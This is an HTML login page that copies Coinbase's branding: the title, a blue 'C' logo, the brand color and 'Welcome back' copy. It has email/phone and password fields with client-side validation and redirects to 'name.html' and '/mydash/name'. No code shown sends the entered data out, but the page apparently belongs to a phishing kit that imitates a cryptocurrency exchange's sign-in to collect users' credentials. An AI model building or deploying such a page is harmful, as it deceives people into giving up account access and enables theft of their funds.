<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - Coinbase</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Arial}
body{background:#fff;width:100%;min-height:100vh;display:flex;flex-direction:column}
.header{padding:18px 20px}
.logo{width:40px;height:40px;background:#0000FF;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:22px}
.container{flex:1;display:flex;flex-direction:column;padding:0 20px}
h1{font-size:32px;font-weight:800;letter-spacing:-0.5px;margin:10px 0 24px;color:#0A0B0D}
.input-group{margin-bottom:14px;position:relative}
input{width:100%;height:52px;border:1px solid #D1D5DB;border-radius:8px;padding:0 14px;font-size:15px;outline:none}
input:focus{border-color:#0052FF}
.input-group .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:18px;cursor:pointer}
.links{margin-top:6px;display:flex;justify-content:space-between;font-size:13px}
.links a{color:#0052FF;text-decoration:none;font-weight:600}
.spacer{flex:1}
.btn{width:100%;height:52px;background:#D1D5DB;border:none;border-radius:28px;color:#fff;font-size:15px;font-weight:600;margin-bottom:20px;cursor:not-allowed;transition:0.2s}
.btn.active{background:#0052FF;cursor:pointer}
.bottom-text{text-align:center;font-size:13px;color:#6B7280;margin-bottom:24px}
.bottom-text a{color:#0052FF;text-decoration:none;font-weight:600}
</style>
</head>
<body>

<div class="header"><div class="logo">C</div></div>

<div class="container">
<h1>Welcome back</h1>

<div class="input-group">
<input type="text" id="loginInput" placeholder="Email or phone" inputmode="text" autocomplete="username" oninput="check()">
</div>

<div class="input-group">
<input type="password" id="password" placeholder="Password" oninput="check()">
<span class="eye" onclick="toggle()">👁️</span>
</div>

<div class="links">
<a href="#">Forgot password?</a>
</div>

<div class="spacer"></div>

<a href="name.html"><button class="btn" id="btn" disabled>Log in</button></a>


<div class="bottom-text">Don't have an account? <a href="#">Create account</a></div>
</div>

<script>
function toggle(){
  const p=document.getElementById('password');
  p.type=p.type==='password'?'text':'password';
}

function check(){
  const login = document.getElementById('loginInput').value.trim();
  const pass = document.getElementById('password').value.trim();
  const btn = document.getElementById('btn');

  const isEmail = login.includes('@') && login.includes('.') && login.length > 5;
  const isPhone = login.replace(/\D/g,'').length >= 10; // at least 10 digits

  const validLogin = isEmail || isPhone;
  const validPass = pass.length >= 6;

  if(validLogin && validPass){
    btn.classList.add('active');
    btn.disabled = false;
  } else {
    btn.classList.remove('active');
    btn.disabled = true;
  }
}

document.getElementById('btn').onclick=()=>{
  if(!document.getElementById('btn').disabled){
    window.location.href='/mydash/name';
  }
}
</script>

</body>
</html>
